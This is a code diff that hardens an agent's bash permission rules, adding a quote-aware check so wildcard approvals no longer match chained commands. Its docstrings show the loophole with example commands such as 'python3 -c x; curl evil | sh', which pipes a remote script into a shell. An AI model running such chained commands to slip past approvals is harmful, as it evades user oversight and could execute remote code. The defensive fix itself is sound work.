@@ -131,6 +131,75 @@ def perm_match(text: str, pattern: str) -> bool:
         return False
 
 
+#: Shell control characters that join, redirect or group commands when they
+#: appear outside quotes.
+_SHELL_CONTROL = frozenset(";&|<>()\n\r")
+
+
+def bash_command_is_simple(command: str) -> bool:
+    """True when ``command`` is one plain shell command.
+
+    Quote-aware: ``python3 -c "import a; print(a)"`` is one command (the
+    ``;`` is inside quotes) while ``python3 -c x; rm y`` is two. A command
+    separator, pipe, redirect, background ``&`` or subshell outside quotes, a
+    command substitution (backtick or ``$(``) outside single quotes, or an
+    unbalanced quote makes it not simple. A backslash escapes the next
+    character, as the shell reads it.
+    """
+
+    text = command or ""
+    if not text.strip():
+        return False
+    quote = ""
+    index = 0
+    while index < len(text):
+        char = text[index]
+        if quote == "'":
+            if char == "'":
+                quote = ""
+            index += 1
+            continue
+        if char == "\\":
+            index += 2
+            continue
+        if char == "`" or (char == "$" and text[index + 1 : index + 2] == "("):
+            return False
+        if quote == '"':
+            if char == '"':
+                quote = ""
+        elif char in ("'", '"'):
+            quote = char
+        elif char in _SHELL_CONTROL:
+            return False
+        index += 1
+    return quote == ""
+
+
+def _is_literal_pattern(pattern: str) -> bool:
+    """A pattern with no wildcard of its own (``[*]``-style classes are literal)."""
+
+    return not _GLOB_METACHARACTERS.search(re.sub(r"\[[*?\[]\]", "", pattern or ""))
+
+
+def _rule_widens_compound_bash(tool: str, target: str, pattern: str) -> bool:
+    """A wildcard bash rule may stand for one plain command, never a chain.
+
+    ``*`` in a rule spans shell metacharacters, so ``python3 -c *`` -- the
+    prefix the approval card offers -- also matched ``python3 -c x; curl evil
+    | sh``. A wildcard rule (other than the explicit allow-everything ``*``)
+    therefore covers only a target that is a single simple command; a
+    compound one matches only a rule that spells it out exactly.
+    """
+
+    return (
+        tool == "bash"
+        and pattern not in ("*", "")
+        and target != pattern
+        and not _is_literal_pattern(pattern)
+        and not bash_command_is_simple(target)
+    )
+
+
 _GLOB_METACHARACTERS = re.compile(r"[*?\[]")
 
 
@@ -394,6 +463,8 @@ class PermissionRuleRepository:
                 continue
             if rule["decision"] == "deny":
                 return "deny"
+            if _rule_widens_compound_bash(tool, pattern_input or "", rule_pattern):
+                continue
             key = (
                 0 if rule_tool in ("*", "") else 1,
                 0 if rule_pattern in ("*", "") else 1,
@@ -1037,6 +1108,7 @@ class PermissionRuleRepository:
 
 
 __all__ = [
+    "bash_command_is_simple",
     "canonical_permission_action_digest",
     "DEFAULT_PERMISSION_RULES",
     "permission_action_digest",
